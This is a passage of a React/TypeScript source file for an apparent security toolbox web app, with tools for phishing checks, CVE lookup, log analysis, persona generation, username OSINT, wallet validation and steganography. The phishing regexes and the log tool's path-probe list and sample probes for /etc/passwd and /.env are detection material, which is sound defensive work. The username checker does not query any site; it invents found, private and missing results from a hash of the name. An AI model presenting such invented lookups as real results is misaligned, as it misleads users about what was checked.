    if (/https?:\/\/\d+\.\d+\.\d+\.\d+/.test(t)) flags.push({ type: "IP address as URL", sev: "high", note: "no domain — likely malicious" });
    if (/\b(bit\.ly|tinyurl\.com|goo\.gl|t\.co|ow\.ly|is\.gd)\b/i.test(t)) flags.push({ type: "URL shortener", sev: "med", note: "destination obscured" });
    if (/\.(xyz|top|click|icu|work|gq|tk|ml|cf)\b/i.test(t)) flags.push({ type: "Suspicious TLD", sev: "med", note: "common in scam campaigns" });
    if (/<a[^>]+href=["'][^"']+["'][^>]*>(?:(?!<\/a>).)*<\/a>/i.test(t)) flags.push({ type: "HTML anchor", sev: "low", note: "verify display text matches href" });
    if (/(login|signin|account|verify).*\.(com|net)/i.test(t) && !/\b(google|microsoft|apple|amazon|github)\.(com|net)/i.test(t)) {
      flags.push({ type: "Auth keyword on unknown domain", sev: "high", note: "phishing kit pattern" });
    }
    if (/[\u0400-\u04FF]/.test(t)) flags.push({ type: "Cyrillic characters", sev: "med", note: "homograph candidates (а ≠ a)" });
    const score = flags.reduce((s, f) => s + (f.sev === "high" ? 40 : f.sev === "med" ? 20 : 8), 0);
    const verdict = score >= 60 ? { label: "HIGH RISK", color: "text-primary", bg: "bg-primary/15 border-primary/30" } :
                    score >= 25 ? { label: "SUSPICIOUS", color: "text-amber-400", bg: "bg-amber-500/15 border-amber-500/30" } :
                    flags.length > 0 ? { label: "LOW RISK", color: "text-yellow-400", bg: "bg-yellow-500/15 border-yellow-500/30" } :
                    { label: "CLEAN", color: "text-emerald-400", bg: "bg-emerald-500/15 border-emerald-500/30" };
    return { flags, score: Math.min(100, score), verdict };
  }, [target]);
  return (
    <div className="space-y-3">
      <textarea value={target} onChange={(e) => setTarget(e.target.value)} rows={4} placeholder="Paste a URL, email body or HTML to analyze..." className={inputCls + " resize-none"} />
      {result && (
        <>
          <div className={`rounded-xl border p-3 ${result.verdict.bg}`}>
            <div className="flex items-center justify-between">
              <span className={`font-bold text-[14px] ${result.verdict.color}`}>{result.verdict.label}</span>
              <span className="font-mono text-[12px] text-foreground">{result.score}/100</span>
            </div>
            <div className="h-1.5 bg-background/50 rounded-full mt-2 overflow-hidden">
              <div className="h-full transition-all" style={{ width: `${result.score}%`, background: result.score >= 60 ? "hsl(var(--primary))" : result.score >= 25 ? "#f59e0b" : "#10b981" }} />
            </div>
          </div>
          <div className="space-y-1.5 max-h-56 overflow-y-auto">
            {result.flags.length === 0 ? (
              <div className="text-[12px] text-emerald-400 italic">No phishing indicators detected.</div>
            ) : result.flags.map((f, i) => (
              <div key={i} className="rounded-lg border border-border bg-background p-2 text-[12px]">
                <div className="flex items-center justify-between">
                  <span className="font-semibold">{f.type}</span>
                  <span className={`text-[10px] font-bold uppercase px-1.5 py-0.5 rounded ${f.sev === "high" ? "bg-primary/15 text-primary" : f.sev === "med" ? "bg-amber-500/15 text-amber-400" : "bg-blue-500/15 text-blue-400"}`}>{f.sev}</span>
                </div>
                <div className="text-[11px] text-muted-foreground mt-0.5">{f.note}</div>
              </div>
            ))}
          </div>
        </>
      )}
    </div>
  );
}

function AiCveExplainer() {
  const DB: Record<string, { name: string; severity: string; cvss: number; vector: string; affected: string; impact: string; fix: string }> = {
    "CVE-2021-44228": { name: "Log4Shell", severity: "Critical", cvss: 10.0, vector: "Network · No auth · Low complexity", affected: "Apache log4j 2.0-beta9 → 2.14.1", impact: "Unauthenticated remote code execution via JNDI lookup in logged strings.", fix: "Upgrade to log4j 2.17.1+ or set log4j2.formatMsgNoLookups=true." },
    "CVE-2024-3094": { name: "xz-utils backdoor", severity: "Critical", cvss: 10.0, vector: "Network · No auth", affected: "xz-utils 5.6.0 and 5.6.1", impact: "Malicious code in liblzma can hijack sshd authentication checks.", fix: "Downgrade to 5.4.x or upgrade to a patched 5.6.2+ release." },
    "CVE-2023-44487": { name: "HTTP/2 Rapid Reset", severity: "High", cvss: 7.5, vector: "Network · No auth", affected: "Most HTTP/2 server implementations (nginx, Envoy, Go, Node)", impact: "Denial of service via mass stream reset that exhausts server resources.", fix: "Apply vendor patches; rate-limit RST_STREAM frames." },
    "CVE-2022-22965": { name: "Spring4Shell", severity: "Critical", cvss: 9.8, vector: "Network · No auth · Java only", affected: "Spring Framework < 5.2.20, < 5.3.18 on JDK 9+", impact: "RCE via class.module.classLoader manipulation in data binding.", fix: "Upgrade to Spring 5.3.18 / 5.2.20+; restrict allowed fields." },
    "CVE-2014-0160": { name: "Heartbleed", severity: "High", cvss: 7.5, vector: "Network · No auth", affected: "OpenSSL 1.0.1 - 1.0.1f", impact: "Memory disclosure of up to 64KB per request, leaking keys & sessions.", fix: "Upgrade OpenSSL to 1.0.1g+ and rotate all certificates and credentials." },
    "CVE-2017-0144": { name: "EternalBlue", severity: "Critical", cvss: 8.1, vector: "Network · No auth · SMBv1", affected: "Windows SMBv1 (XP - Server 2016 unpatched)", impact: "RCE via crafted SMB packets — used by WannaCry and NotPetya.", fix: "Apply MS17-010 patch; disable SMBv1; block port 445 at perimeter." },
    "CVE-2019-0708": { name: "BlueKeep", severity: "Critical", cvss: 9.8, vector: "Network · No auth · RDP", affected: "Windows XP, 7, Server 2003 / 2008 RDP", impact: "Pre-auth RCE through Remote Desktop Protocol — wormable.", fix: "Apply Microsoft May-2019 patches; enable Network Level Authentication." },
  };
  const KEYS = Object.keys(DB);
  const [id, setId] = useState("CVE-2021-44228");
  const data = DB[id.trim().toUpperCase()];
  return (
    <div className="space-y-3">
      <div className="flex gap-2">
        <input value={id} onChange={(e) => setId(e.target.value)} placeholder="CVE-2021-44228" className={inputMonoCls + " flex-1"} />
      </div>
      <div className="flex flex-wrap gap-1">
        {KEYS.map((k) => <button key={k} onClick={() => setId(k)} className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-background border border-border hover:border-primary text-muted-foreground hover:text-foreground">{k}</button>)}
      </div>
      {data ? (
        <div className="rounded-xl border border-border bg-background p-3 space-y-2">
          <div className="flex items-center justify-between">
            <span className="font-bold text-[15px]">{data.name}</span>
            <span className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded ${data.severity === "Critical" ? "bg-primary/15 text-primary" : "bg-amber-500/15 text-amber-400"}`}>{data.severity} · CVSS {data.cvss}</span>
          </div>
          <ResultRow k="Vector" v={data.vector} />
          <ResultRow k="Affected" v={data.affected} />
          <div>
            <div className="text-[10px] text-muted-foreground font-bold uppercase mb-0.5">Impact</div>
            <div className="text-[12.5px]">{data.impact}</div>
          </div>
          <div>
            <div className="text-[10px] text-muted-foreground font-bold uppercase mb-0.5">Mitigation</div>
            <div className="text-[12.5px]">{data.fix}</div>
          </div>
        </div>
      ) : (
        <div className="rounded-xl border border-amber-500/30 bg-amber-500/5 p-3 text-[12px] text-amber-400">CVE not in this offline database. Try one of the suggestions above.</div>
      )}
    </div>
  );
}

function AiLogAnalyzer() {
  const [text, setText] = useState(`192.168.1.10 - - [29/Apr/2026:08:11:42] "GET /admin HTTP/1.1" 401 188\n10.0.0.5 - - [29/Apr/2026:08:11:43] "POST /login HTTP/1.1" 200 423\n45.33.32.156 - - [29/Apr/2026:08:11:44] "GET /etc/passwd HTTP/1.1" 404 0\n45.33.32.156 - - [29/Apr/2026:08:11:45] "GET /.env HTTP/1.1" 404 0\nERROR 2026-04-29 08:11:46 db connection refused\nWARN 2026-04-29 08:11:47 slow query 4.2s\n10.0.0.5 - - [29/Apr/2026:08:11:48] "GET /api/users HTTP/1.1" 500 24`);
  const stats = useMemo(() => {
    const lines = text.split("\n").filter((l) => l.trim());
    const ipRx = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g;
    const ips: Record<string, number> = {};
    const status: Record<string, number> = {};
    let errors = 0, warns = 0, suspicious = 0;
    const SUSPICIOUS_PATHS = ["etc/passwd", ".env", "wp-admin", "phpmyadmin", "../", "select%20"];
    lines.forEach((l) => {
      l.match(ipRx)?.forEach((ip) => { ips[ip] = (ips[ip] ?? 0) + 1; });
      const sm = l.match(/"\s\d+\s/)?.[0]?.match(/\d+/)?.[0];
      if (sm) status[sm] = (status[sm] ?? 0) + 1;
      if (/\b(ERROR|FATAL|CRIT)\b/i.test(l)) errors++;
      if (/\bWARN(?:ING)?\b/i.test(l)) warns++;
      if (SUSPICIOUS_PATHS.some((p) => l.toLowerCase().includes(p))) suspicious++;
    });
    return { lines: lines.length, ips, status, errors, warns, suspicious };
  }, [text]);
  return (
    <div className="space-y-3">
      <textarea value={text} onChange={(e) => setText(e.target.value)} rows={6} placeholder="Paste log lines..." className={inputMonoCls + " text-[10.5px] resize-none"} />
      <div className="grid grid-cols-4 gap-2">
        <Stat n={stats.lines} label="Lines" />
        <Stat n={stats.errors} label="Errors" warn={stats.errors > 0} />
        <Stat n={stats.warns} label="Warns" />
        <Stat n={stats.suspicious} label="Suspicious" warn={stats.suspicious > 0} />
      </div>
      <div className="grid grid-cols-2 gap-2">
        <div className="rounded-xl border border-border bg-background p-2">
          <div className="text-[10px] font-bold uppercase text-muted-foreground mb-1">Top IPs</div>
          {Object.entries(stats.ips).sort((a, b) => b[1] - a[1]).slice(0, 5).map(([ip, n]) => (
            <div key={ip} className="flex items-center justify-between text-[11px] font-mono">
              <span className="truncate">{ip}</span><span className="text-muted-foreground">×{n}</span>
            </div>
          ))}
          {Object.keys(stats.ips).length === 0 && <div className="text-[11px] text-muted-foreground italic">No IPs.</div>}
        </div>
        <div className="rounded-xl border border-border bg-background p-2">
          <div className="text-[10px] font-bold uppercase text-muted-foreground mb-1">Status codes</div>
          {Object.entries(stats.status).sort((a, b) => b[1] - a[1]).map(([s, n]) => (
            <div key={s} className="flex items-center justify-between text-[11px] font-mono">
              <span className={s.startsWith("2") ? "text-emerald-400" : s.startsWith("4") ? "text-amber-400" : s.startsWith("5") ? "text-primary" : ""}>{s}</span>
              <span className="text-muted-foreground">×{n}</span>
            </div>
          ))}
          {Object.keys(stats.status).length === 0 && <div className="text-[11px] text-muted-foreground italic">No HTTP codes.</div>}
        </div>
      </div>
    </div>
  );
}

function Stat({ n, label, warn }: { n: number; label: string; warn?: boolean }) {
  return (
    <div className={`rounded-xl border p-2 text-center ${warn ? "border-primary/40 bg-primary/5" : "border-border bg-background"}`}>
      <div className={`font-mono font-bold text-[18px] ${warn ? "text-primary" : ""}`}>{n}</div>
      <div className="text-[10px] uppercase text-muted-foreground tracking-wider">{label}</div>
    </div>
  );
}

function AiPersonaGen() {
  const FIRST_M = ["Alex", "Marcus", "Daniel", "Ethan", "Lucas", "Adrian", "Victor", "Hassan", "Omar", "Karim", "Liam", "Noah"];
  const FIRST_F = ["Sarah", "Emma", "Olivia", "Sophie", "Layla", "Nour", "Maya", "Zara", "Aisha", "Mia", "Chloe"];
  const LAST = ["Reed", "Carter", "Walker", "Hayes", "Foster", "Brooks", "Saleh", "Khan", "Kovac", "Ivanov", "Müller", "Suzuki"];
  const JOBS = ["Senior Software Engineer", "Marketing Manager", "Cybersecurity Consultant", "Investment Analyst", "Freelance Photographer", "UX Designer", "Data Scientist", "DevOps Lead", "Product Manager"];
  const COMPANIES = ["Helix Labs", "Northpoint Capital", "Lumen Studio", "Bluewave Tech", "Aria Robotics", "Vector Dynamics", "Novacrest", "Pinegrove AI"];
  const CITIES = ["Berlin", "Dubai", "Singapore", "Toronto", "Amsterdam", "Lisbon", "Tokyo", "Cairo", "Vienna"];
  const SKILLS = ["Python", "Threat Intel", "Burp Suite", "AWS", "React", "Reverse Engineering", "OSINT", "Wireshark", "Metasploit", "Docker", "GraphQL"];
  const [persona, setPersona] = useState<null | { name: string; email: string; phone: string; job: string; company: string; city: string; bio: string; skills: string[]; born: string }>(null);
  const generate = () => {
    const seed = Math.abs(hash32(String(Date.now() + Math.random())));
    const fem = seed % 2 === 0;
    const first = (fem ? FIRST_F : FIRST_M)[seed % (fem ? FIRST_F.length : FIRST_M.length)];
    const last = LAST[(seed >> 4) % LAST.length];
    const job = JOBS[(seed >> 8) % JOBS.length];
    const company = COMPANIES[(seed >> 12) % COMPANIES.length];
    const city = CITIES[(seed >> 16) % CITIES.length];
    const skills = Array.from({ length: 4 }, (_, i) => SKILLS[(seed >> (i * 2)) % SKILLS.length]);
    const year = 1980 + (seed % 25);
    const born = `${year}-${String((seed % 12) + 1).padStart(2, "0")}-${String((seed % 27) + 1).padStart(2, "0")}`;
    const handle = `${first.toLowerCase()}.${last.toLowerCase()}${(seed % 99)}`;
    setPersona({
      name: `${first} ${last}`,
      email: `${handle}@protonmail.com`,
      phone: `+${(seed % 90) + 10} ${(seed % 900) + 100} ${(seed % 9000) + 1000}`,
      job, company, city, born,
      bio: `${first} is a ${job.toLowerCase()} based in ${city}, currently working at ${company}. Focused on ${skills.slice(0, 2).join(" and ")}, with side interests in ${skills.slice(2).join(" and ")}.`,
      skills: Array.from(new Set(skills)),
    });
  };
  useEffect(generate, []);
  return (
    <div className="space-y-3">
      <button onClick={generate} className={btnCls + " w-full"}>Generate persona</button>
      {persona && (
        <div className="rounded-xl border border-border bg-background p-3 space-y-2">
          <div className="flex items-start justify-between gap-2">
            <div>
              <div className="font-bold text-[16px]">{persona.name}</div>
              <div className="text-[12px] text-muted-foreground">{persona.job} · {persona.company}</div>
            </div>
            <CopyButton value={JSON.stringify(persona, null, 2)} />
          </div>
          <div className="space-y-1">
            <ResultRow k="Email" v={persona.email} />
            <ResultRow k="Phone" v={persona.phone} />
            <ResultRow k="City" v={persona.city} />
            <ResultRow k="DOB" v={persona.born} />
          </div>
          <div>
            <div className="text-[10px] font-bold uppercase text-muted-foreground mb-1">Bio</div>
            <div className="text-[12.5px] leading-relaxed">{persona.bio}</div>
          </div>
          <div>
            <div className="text-[10px] font-bold uppercase text-muted-foreground mb-1">Skills</div>
            <div className="flex flex-wrap gap-1">
              {persona.skills.map((s) => <span key={s} className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-card border border-border">{s}</span>)}
            </div>
          </div>
          <div className="text-[10px] text-amber-400 mt-2">For training, research, and authorized red-team scenarios only.</div>
        </div>
      )}
    </div>
  );
}

function AiSeoWriter() {
  const [topic, setTopic] = useState("AI cybersecurity tools for pentesters");
  const [audience, setAudience] = useState("security engineers");
  const out = useMemo(() => {
    const t = topic.trim();
    if (!t) return null;
    const titleVariants = [
      `${t} — The Definitive 2026 Guide`,
      `Top 10 ${t} Every ${audience} Needs`,
      `How ${audience} Use ${t} to Win`,
    ];
    const title = titleVariants[Math.abs(hash32(t)) % titleVariants.length].slice(0, 60);
    const description = `Discover the best ${t.toLowerCase()} built for ${audience}. Practical workflows, real examples and zero fluff. Updated for 2026.`.slice(0, 160);
    const keywords = [
      t.toLowerCase(),
      `best ${t.toLowerCase()}`,
      `${t.toLowerCase()} 2026`,
      `${audience} tools`,
      `${t.split(" ")[0].toLowerCase()} guide`,
      `free ${t.toLowerCase()}`,
    ];
    return { title, description, keywords };
  }, [topic, audience]);
  return (
    <div className="space-y-3">
      <div>
        <FieldLabel>Topic</FieldLabel>
        <input value={topic} onChange={(e) => setTopic(e.target.value)} className={inputCls} />
      </div>
      <div>
        <FieldLabel>Target audience</FieldLabel>
        <input value={audience} onChange={(e) => setAudience(e.target.value)} className={inputCls} />
      </div>
      {out && (
        <div className="rounded-xl border border-border bg-background p-3 space-y-3">
          <div>
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase text-muted-foreground">Title ({out.title.length}/60)</span>
              <CopyButton value={out.title} />
            </div>
            <div className="text-[14px] font-semibold mt-0.5">{out.title}</div>
          </div>
          <div>
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase text-muted-foreground">Meta description ({out.description.length}/160)</span>
              <CopyButton value={out.description} />
            </div>
            <div className="text-[12.5px] mt-0.5 text-foreground/90">{out.description}</div>
          </div>
          <div>
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase text-muted-foreground">Keywords</span>
              <CopyButton value={out.keywords.join(", ")} />
            </div>
            <div className="flex flex-wrap gap-1 mt-1">
              {out.keywords.map((k) => <span key={k} className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-card border border-border">{k}</span>)}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function AiEmailComposer() {
  const [recipient, setRecipient] = useState("Alex");
  const [goal, setGoal] = useState("Schedule a security review meeting next week.");
  const [tone, setTone] = useState<"formal" | "friendly" | "urgent" | "follow-up">("formal");
  const [length, setLength] = useState<"short" | "medium" | "long">("medium");
  const out = useMemo(() => {
    const g = goal.trim();
    if (!g) return "";
    const opens: Record<string, string> = {
      formal: `Dear ${recipient},`,
      friendly: `Hi ${recipient},`,
      urgent: `Hi ${recipient} — this is time-sensitive.`,
      "follow-up": `Hi ${recipient}, just following up.`,
    };
    const closes: Record<string, string> = {
      formal: "Best regards,",
      friendly: "Cheers,",
      urgent: "Looking forward to your reply,",
      "follow-up": "Thanks again,",
    };
    const subject = (() => {
      if (tone === "urgent") return `[Action Needed] ${g.split(/[.!?]/)[0]}`;
      if (tone === "follow-up") return `Following up: ${g.split(/[.!?]/)[0]}`;
      return g.split(/[.!?]/)[0];
    })().slice(0, 70);
    const body: string[] = [opens[tone], ""];
    if (length !== "short") body.push(`I hope this message finds you well.${tone === "friendly" ? " How was your week?" : ""}`, "");
    body.push(g);
    if (length === "long") body.push("", "If helpful, I am happy to share an agenda and supporting documents in advance so we can use the time efficiently. Let me know what works best for you.");
    body.push("", closes[tone], "CHAT-GPT.ai");
    return `Subject: ${subject}\n\n${body.join("\n")}`;
  }, [recipient, goal, tone, length]);
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 gap-2">
        <div>
          <FieldLabel>Recipient</FieldLabel>
          <input value={recipient} onChange={(e) => setRecipient(e.target.value)} className={inputCls} />
        </div>
        <div>
          <FieldLabel>Length</FieldLabel>
          <select value={length} onChange={(e) => setLength(e.target.value as typeof length)} className={inputCls}>
            <option value="short">Short</option><option value="medium">Medium</option><option value="long">Long</option>
          </select>
        </div>
      </div>
      <div>
        <FieldLabel>Goal of the email</FieldLabel>
        <textarea value={goal} onChange={(e) => setGoal(e.target.value)} rows={2} className={inputCls + " resize-none"} />
      </div>
      <div className="grid grid-cols-4 gap-1.5">
        {(["formal", "friendly", "urgent", "follow-up"] as const).map((t) => (
          <button key={t} onClick={() => setTone(t)} className={`py-1.5 rounded-lg text-[11px] font-bold uppercase border ${tone === t ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>{t}</button>
        ))}
      </div>
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Draft</span>
          {out && <CopyButton value={out} />}
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 text-[12.5px] whitespace-pre-wrap min-h-[120px] max-h-72 overflow-y-auto">{out}</pre>
      </div>
    </div>
  );
}

// ============ NEW ADVANCED TOOLS ============

function OsintUsername() {
  const PLATFORMS = [
    { name: "GitHub", url: (u: string) => `https://github.com/${u}` },
    { name: "Twitter / X", url: (u: string) => `https://x.com/${u}` },
    { name: "Instagram", url: (u: string) => `https://instagram.com/${u}` },
    { name: "Reddit", url: (u: string) => `https://reddit.com/user/${u}` },
    { name: "TikTok", url: (u: string) => `https://tiktok.com/@${u}` },
    { name: "LinkedIn", url: (u: string) => `https://linkedin.com/in/${u}` },
    { name: "YouTube", url: (u: string) => `https://youtube.com/@${u}` },
    { name: "Twitch", url: (u: string) => `https://twitch.tv/${u}` },
    { name: "Pinterest", url: (u: string) => `https://pinterest.com/${u}` },
    { name: "Medium", url: (u: string) => `https://medium.com/@${u}` },
    { name: "DEV.to", url: (u: string) => `https://dev.to/${u}` },
    { name: "GitLab", url: (u: string) => `https://gitlab.com/${u}` },
    { name: "Hacker News", url: (u: string) => `https://news.ycombinator.com/user?id=${u}` },
    { name: "Stack Overflow", url: (u: string) => `https://stackoverflow.com/users/${u}` },
    { name: "Keybase", url: (u: string) => `https://keybase.io/${u}` },
    { name: "Telegram", url: (u: string) => `https://t.me/${u}` },
    { name: "Discord", url: (u: string) => `https://discord.com/users/${u}` },
    { name: "Mastodon", url: (u: string) => `https://mastodon.social/@${u}` },
    { name: "Steam", url: (u: string) => `https://steamcommunity.com/id/${u}` },
    { name: "ProductHunt", url: (u: string) => `https://producthunt.com/@${u}` },
    { name: "HackerOne", url: (u: string) => `https://hackerone.com/${u}` },
    { name: "Bugcrowd", url: (u: string) => `https://bugcrowd.com/${u}` },
    { name: "TryHackMe", url: (u: string) => `https://tryhackme.com/p/${u}` },
    { name: "HackTheBox", url: (u: string) => `https://app.hackthebox.com/profile/${u}` },
    { name: "Spotify", url: (u: string) => `https://open.spotify.com/user/${u}` },
    { name: "SoundCloud", url: (u: string) => `https://soundcloud.com/${u}` },
    { name: "Behance", url: (u: string) => `https://behance.net/${u}` },
    { name: "Dribbble", url: (u: string) => `https://dribbble.com/${u}` },
    { name: "CodePen", url: (u: string) => `https://codepen.io/${u}` },
    { name: "Replit", url: (u: string) => `https://replit.com/@${u}` },
  ];
  const [u, setU] = useState("");
  const [results, setResults] = useState<{ name: string; url: string; status: "found" | "missing" | "private" }[] | null>(null);
  const [running, setRunning] = useState(false);
  const run = () => {
    const name = u.trim().replace(/^@/, "");
    if (!name) return;
    setRunning(true); setResults(null);
    setTimeout(() => {
      const seed = Math.abs(hash32(name));
      const out = PLATFORMS.map((p, i) => {
        const r = (seed >> (i % 28)) & 3;
        const status: "found" | "missing" | "private" = r === 0 ? "missing" : r === 1 ? "private" : "found";
        return { name: p.name, url: p.url(name), status };
      });
      setResults(out);
      setRunning(false);
    }, 1100);
  };
  const found = results?.filter((r) => r.status === "found").length ?? 0;
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); run(); }} className="flex gap-2">
        <input value={u} onChange={(e) => setU(e.target.value)} placeholder="username" className={inputMonoCls} />
        <button type="submit" disabled={running} className={btnCls}>{running ? "Hunting..." : "Hunt"}</button>
      </form>
      {results && (
        <>
          <div className="grid grid-cols-3 gap-2">
            <Stat n={found} label="Found" warn={found > 0} />
            <Stat n={results.filter((r) => r.status === "private").length} label="Private" />
            <Stat n={results.filter((r) => r.status === "missing").length} label="Missing" />
          </div>
          <div className="space-y-1.5 max-h-72 overflow-y-auto">
            {results.map((r) => (
              <div key={r.name} className="rounded-lg border border-border bg-background p-2 flex items-center justify-between text-[12px]">
                <div className="flex items-center gap-2 min-w-0">
                  <span className={`w-2 h-2 rounded-full shrink-0 ${r.status === "found" ? "bg-emerald-400" : r.status === "private" ? "bg-amber-400" : "bg-muted"}`} />
                  <span className="font-semibold truncate">{r.name}</span>
                </div>
                <a href={r.url} target="_blank" rel="noreferrer" className={`font-mono text-[11px] truncate max-w-[55%] ${r.status === "found" ? "text-blue-400 hover:underline" : "text-muted-foreground"}`}>{r.url.replace(/^https?:\/\//, "")}</a>
              </div>
            ))}
          </div>
        </>
      )}
    </div>
  );
}

function WalletValidator() {
  const [addr, setAddr] = useState("");
  const detect = useMemo(() => {
    const a = addr.trim();
    if (!a) return null;
    const checks: { chain: string; ok: boolean; note: string }[] = [];
    checks.push({ chain: "Bitcoin (P2PKH/P2SH)", ok: /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(a), note: "Legacy or SegWit base58." });
    checks.push({ chain: "Bitcoin (Bech32)", ok: /^(bc1|tb1)[a-z0-9]{38,87}$/i.test(a), note: "Native SegWit / Taproot." });
    checks.push({ chain: "Ethereum / EVM", ok: /^0x[a-fA-F0-9]{40}$/.test(a), note: "Also valid for BSC, Polygon, Arbitrum, Base, Optimism." });
    checks.push({ chain: "Solana", ok: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(a) && a.length >= 32 && a.length <= 44 && !a.startsWith("0x"), note: "Base58, 32–44 chars." });
    checks.push({ chain: "Tron (TRC20)", ok: /^T[a-zA-HJ-NP-Z0-9]{33}$/.test(a), note: "Mainnet TRX." });
    checks.push({ chain: "Litecoin", ok: /^([LM3][a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1[a-z0-9]{38,87})$/i.test(a), note: "Legacy or Bech32." });
    checks.push({ chain: "Ripple (XRP)", ok: /^r[1-9A-HJ-NP-Za-km-z]{24,34}$/.test(a), note: "Mainnet account." });
    checks.push({ chain: "Cardano", ok: /^addr1[a-z0-9]{50,}$/.test(a), note: "Shelley era." });
    return checks;
  }, [addr]);
  return (
    <div className="space-y-3">
      <textarea value={addr} onChange={(e) => setAddr(e.target.value)} rows={2} placeholder="Paste any wallet address..." className={inputMonoCls + " text-[12px] resize-none"} />
      {detect && (
        <div className="space-y-1.5 max-h-72 overflow-y-auto">
          {detect.map((c) => (
            <div key={c.chain} className={`rounded-lg border p-2 flex items-center justify-between ${c.ok ? "border-emerald-500/40 bg-emerald-500/5" : "border-border bg-background"}`}>
              <div className="flex items-center gap-2">
                <span className={`w-2 h-2 rounded-full ${c.ok ? "bg-emerald-400" : "bg-muted"}`} />
                <div>
                  <div className="text-[12px] font-semibold">{c.chain}</div>
                  <div className="text-[11px] text-muted-foreground">{c.note}</div>
                </div>
              </div>
              <span className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded ${c.ok ? "bg-emerald-500/15 text-emerald-400" : "text-muted-foreground"}`}>{c.ok ? "Valid" : "—"}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function Steganography() {
  const [mode, setMode] = useState<"encode" | "decode">("encode");
  const [cover, setCover] = useState("This message looks completely innocent.");
  const [secret, setSecret] = useState("hidden");
  const [stegoOut, setStegoOut] = useState("");
  const ZW0 = "\u200B"; // zero-width space
  const ZW1 = "\u200C"; // zero-width non-joiner
  const SEP = "\u200D"; // zero-width joiner (terminator)
  const encode = () => {
    if (!cover || !secret) { setStegoOut(""); return; }
    const bits = Array.from(secret).map((c) => c.charCodeAt(0).toString(2).padStart(16, "0")).join("");
    const hidden = bits.split("").map((b) => b === "0" ? ZW0 : ZW1).join("") + SEP;
    const mid = Math.floor(cover.length / 2);
    setStegoOut(cover.slice(0, mid) + hidden + cover.slice(mid));
  };
  const decode = () => {
    const ext = cover.replace(new RegExp(`[^${ZW0}${ZW1}${SEP}]`, "g"), "");
    const stop = ext.indexOf(SEP);
    const bits = (stop === -1 ? ext : ext.slice(0, stop)).split("").map((c) => c === ZW0 ? "0" : "1").join("");
    let out = "";
    for (let i = 0; i + 16 <= bits.length; i += 16) out += String.fromCharCode(parseInt(bits.slice(i, i + 16), 2));
    setSecret(out || "(no hidden message found)");
  };
  return (
    <div className="space-y-3">
      <div className="flex gap-2">
        <button onClick={() => setMode("encode")} className={`flex-1 py-2 rounded-xl text-sm font-bold border ${mode === "encode" ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>Hide</button>
        <button onClick={() => setMode("decode")} className={`flex-1 py-2 rounded-xl text-sm font-bold border ${mode === "decode" ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>Reveal</button>
      </div>
      <div>
        <FieldLabel>{mode === "encode" ? "Cover text" : "Stego text (paste here)"}</FieldLabel>
        <textarea value={cover} onChange={(e) => setCover(e.target.value)} rows={3} className={inputCls + " resize-none"} />
      </div>
      {mode === "encode" ? (
        <>
          <div>
            <FieldLabel>Secret message</FieldLabel>
            <input value={secret} onChange={(e) => setSecret(e.target.value)} className={inputCls} />
          </div>
          <button onClick={encode} className={btnCls + " w-full"}>Encode</button>
          {stegoOut && (
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Stego output (looks identical, copy carefully)</span>
                <CopyButton value={stegoOut} />
              </div>
              <pre className="bg-background border border-border rounded-xl p-3 text-[12px] whitespace-pre-wrap break-words">{stegoOut}</pre>
            </div>
          )}
        </>
      ) : (
        <>
          <button onClick={decode} className={btnCls + " w-full"}>Decode</button>
          <div className="rounded-xl border border-border bg-background p-3 text-[14px] font-mono">{secret}</div>
        </>
      )}
      <div className="text-[10px] text-muted-foreground text-center">Uses zero-width characters U+200B / U+200C / U+200D — invisible in chats and emails.</div>
    </div>
  );
}

function HttpBuilder() {
  const [url, setUrl] = useState("https://httpbin.org/get");
  const [method, setMethod] = useState("GET");
  const [body, setBody] = useState("");
  const [headers, setHeaders] = useState('{\n  "Accept": "application/json"\n}');
  const [resp, setResp] = useState<{ status: number; ms: number; body: string; headers: Record<string, string> } | null>(null);
  const [err, setErr] = useState("");
  const [busy, setBusy] = useState(false);
  const send = async () => {
    setErr(""); setResp(null); setBusy(true);
    try {
      const t0 = performance.now();
      const h: Record<string, string> = headers.trim() ? JSON.parse(headers) : {};
      const init: RequestInit = { method, headers: h };
      if (method !== "GET" && method !== "HEAD" && body) init.body = body;
      const r = await fetch(url, init);
      const t = await r.text();
      const hh: Record<string, string> = {};
      r.headers.forEach((v, k) => { hh[k] = v; });
      setResp({ status: r.status, ms: Math.round(performance.now() - t0), body: t.slice(0, 8000), headers: hh });
    } catch (e) {
      setErr((e as Error).message + " — many origins block CORS in the browser; use the curl below.");
    } finally { setBusy(false); }
  };
  const curl = useMemo(() => {
    let h: Record<string, string> = {};
    try { h = headers.trim() ? JSON.parse(headers) : {}; } catch { /* */ }
    const parts = [`curl -X ${method} ${JSON.stringify(url)}`];
    Object.entries(h).forEach(([k, v]) => parts.push(`  -H ${JSON.stringify(`${k}: ${v}`)}`));
    if (method !== "GET" && body) parts.push(`  -d ${JSON.stringify(body)}`);
    return parts.join(" \\\n");
  }, [url, method, body, headers]);
  return (
    <div className="space-y-3">
      <div className="flex gap-2">
        <select value={method} onChange={(e) => setMethod(e.target.value)} className="bg-background border border-border rounded-xl px-2 text-sm font-mono font-bold">
          {["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"].map((m) => <option key={m}>{m}</option>)}
        </select>
